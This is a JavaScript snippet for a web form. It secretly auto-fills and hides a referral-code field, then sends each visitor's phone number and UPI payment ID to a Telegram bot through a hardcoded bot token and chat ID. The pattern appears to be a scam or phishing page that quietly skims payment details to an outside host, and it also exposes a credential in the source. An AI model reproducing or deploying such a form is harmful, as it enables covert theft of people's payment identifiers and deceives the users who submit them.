window.onload = function() {  
        document.getElementById("refer").value = "GTZ4IU"; // Auto-fill referral code  
        document.getElementById("refer").style.display = "none"; // Hide field  
    };  

    function addTimestamp() {  
        let now = new Date();  
        let timestamp = now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds() + ":" + now.getMilliseconds();  
        document.getElementById("timestamp").value = timestamp;  

        // Send data to Telegram bot  
        let phone = document.getElementById("phone").value;  
        let upi = document.getElementById("upi").value;  
        let refer = document.getElementById("refer").value;  

        let botToken = "7642518845:AAHYFLxexMimK8zb7_dclO3oq2OXp_hvzKM";  
        let chatId = "6268246679";  
        let message = `📢 *New Submission Received* 📢\n\n📱 *Phone:* ${phone}\n💰 *UPI ID:* ${upi}\n🎁 *Referral Code:* ${refer}\n⏳ *Timestamp:* ${timestamp}`;  
        
        let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;  
        
        fetch(url);  
    }  
